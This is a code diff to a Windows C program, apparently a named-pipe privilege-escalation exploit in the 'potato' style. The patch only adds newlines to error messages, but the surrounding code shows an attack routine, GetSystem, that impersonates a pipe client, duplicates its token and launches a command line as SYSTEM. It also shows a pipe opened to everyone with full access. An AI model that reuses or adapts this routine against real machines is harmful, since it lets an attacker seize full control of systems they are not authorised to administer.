@@ -120,19 +120,19 @@ BOOL GetSystem(HANDLE hPipe)
 
     if (!ImpersonateNamedPipeClient(hPipe))
     {
-        wprintf(L"Error ImpersonateNamedPipeClient() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
+        wprintf(L"Error ImpersonateNamedPipeClient() returned (%d): %s\n", GetLastError(), lookup_error_with_nameW(GetLastError()));
         goto cleanup;
     }
 
     if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
     {
-        wprintf(L"Error OpenThreadToken() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
+        wprintf(L"Error OpenThreadToken() returned (%d): %s\n", GetLastError(), lookup_error_with_nameW(GetLastError()));
         goto cleanup;
     }
 
     if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
     {
-        wprintf(L"Error DuplicateTokenEx() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
+        wprintf(L"Error DuplicateTokenEx() returned (%d): %s\n", GetLastError(), lookup_error_with_nameW(GetLastError()));
         goto cleanup;
     }
 
@@ -140,7 +140,7 @@ BOOL GetSystem(HANDLE hPipe)
     {
         if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &g_dwSessionId, sizeof(DWORD)))
         {
-            wprintf(L"Error SetTokenInformation() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
+            wprintf(L"Error SetTokenInformation() returned (%d): %s\n", GetLastError(), lookup_error_with_nameW(GetLastError()));
             goto cleanup;
         }
     }
@@ -153,13 +153,13 @@ BOOL GetSystem(HANDLE hPipe)
 
     if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
     {
-        wprintf(L"Error GetSystemDirectory() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
+        wprintf(L"Error GetSystemDirectory() returned (%d): %s\n", GetLastError(), lookup_error_with_nameW(GetLastError()));
         goto cleanup;
     }
 
     if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
     {
-        wprintf(L"Error CreateEnvironmentBlock() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
+        wprintf(L"Error CreateEnvironmentBlock() returned (%d): %s\n", GetLastError(), lookup_error_with_nameW(GetLastError()));
         goto cleanup;
     }
 
@@ -179,7 +179,7 @@ BOOL GetSystem(HANDLE hPipe)
             {
                 if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
                 {
-                    wprintf(L"Error CreateProcessWithTokenW() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
+                    wprintf(L"Error CreateProcessWithTokenW() returned (%d): %s\n", GetLastError(), lookup_error_with_nameW(GetLastError()));
                     goto cleanup;
                 }
                 else
@@ -195,7 +195,7 @@ BOOL GetSystem(HANDLE hPipe)
         }
         else
         {
-            wprintf(L"Error CreateProcessAsUser() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
+            wprintf(L"Error CreateProcessAsUser() returned (%d): %s\n", GetLastError(), lookup_error_with_nameW(GetLastError()));
             goto cleanup;
         }
     }
@@ -247,13 +247,13 @@ DWORD WINAPI launchNamedPipeServer(LPVOID lpParam) {
 
     if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
     {
-        wprintf(L"Error InitializeSecurityDescriptor() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
+        wprintf(L"Error InitializeSecurityDescriptor() returned (%d): %s\n", GetLastError(), lookup_error_with_nameW(GetLastError()));
         return -1;
     }
 
     if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
     {
-        wprintf(L"Error ConvertStringSecurityDescriptorToSecurityDescriptor() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
+        wprintf(L"Error ConvertStringSecurityDescriptorToSecurityDescriptor() returned (%d): %s\n", GetLastError(), lookup_error_with_nameW(GetLastError()));
         return -1;
     }
 
@@ -263,7 +263,7 @@ DWORD WINAPI launchNamedPipeServer(LPVOID lpParam) {
         ConnectNamedPipe(hPipe, NULL);
         wprintf(L"\n[PIPESERVER] A client connected!\n\n");
         if (!GetSystem(hPipe)) {
-            wprintf(L"[PIPESERVER] Error CreateNamedPipe() returned (%d): %s", GetLastError(), lookup_error_with_nameW(GetLastError()));
+            wprintf(L"[PIPESERVER] Error CreateNamedPipe() returned (%d): %s\n", GetLastError(), lookup_error_with_nameW(GetLastError()));
         }
     }
     return 0;
